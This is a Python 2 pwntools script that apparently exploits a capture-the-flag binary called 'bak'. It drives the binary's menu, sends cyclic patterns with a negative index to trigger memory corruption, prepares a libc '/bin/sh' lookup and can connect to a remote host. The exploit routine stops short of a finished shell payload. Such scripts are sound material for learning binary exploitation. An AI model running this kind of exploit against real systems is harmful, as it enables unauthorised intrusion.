#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#import os
code = ELF('./bak', checksec=False)
context.arch = code.arch
context.log_level = 'debug'
#gadget = lambda x: next(code.search(asm(x, os='linux', arch=code.arch)))
#context.terminal = ['tmux', 'new-window']
#debug = lambda : gdb.attach(r) #, gdbscript='b *{:#x}'.format(code.address+0x10EE))
binsh = lambda : next(libc.search('/bin/sh'))
uu64 = lambda x: u64(x.ljust(8, '\0'))

def load(idx, width, height, data):
    r.sendlineafter('> ', '0')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(width))
    r.sendlineafter(': ', str(height))
    assert width * height == len(data)

    r.sendlineafter(': ', enhex(data))

def loadf(idx, width, height, data):
    r.sendlineafter('> ', '0')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', 'y')
    r.sendlineafter(': ', str(width))
    r.sendlineafter(': ', str(height))
    assert width * height == len(data)

    r.sendlineafter(': ', enhex(data))
def note(idx, size, data):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(size))
    r.sendlineafter(': ', data)

def show():
    r.sendlineafter('> ', '2')

def tf(op, iidx, oidx, midx):
    r.sendlineafter('> ', '3')
    r.sendlineafter('tion: ', str(op))
    r.sendlineafter('[0 - 3]: ', str(iidx))
    r.sendlineafter('[0 - 3]: ', str(oidx))
    r.sendlineafter(': ', str(midx))

def exploit(r):
    load(1, 32, 1, cyclic(32))
    note(1, 1, 'a')
    raw_input('#')
    for i in range(10):
        tf(11, 1, 1, -1)
        loadf(1, 32, 32, cyclic(32*32))
        tf(11, 1, 1, -1)
        loadf(1, 32, 1, cyclic(32))


    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 2:
        r = remote(sys.argv[1], int(sys.argv[2]))
        libc = code.libc if code.libc else ELF('./bc.so.6', checksec=False)
    elif len(sys.argv) > 1:
        os.environ['LD_LIBRARY_PATH'] = '/dbg64/'
        #r = remote('127.0.0.1', 4444)
        r = code.process()
        libc = ELF('/dbg64/libc-amd64.so', checksec=False)
    else:
        #r = remote('127.0.0.1', 4444)
        r = code.process()
        libc = code.libc if code.libc else ELF('./bc.so.6', checksec=False)
    print code, libc
    exploit(r)
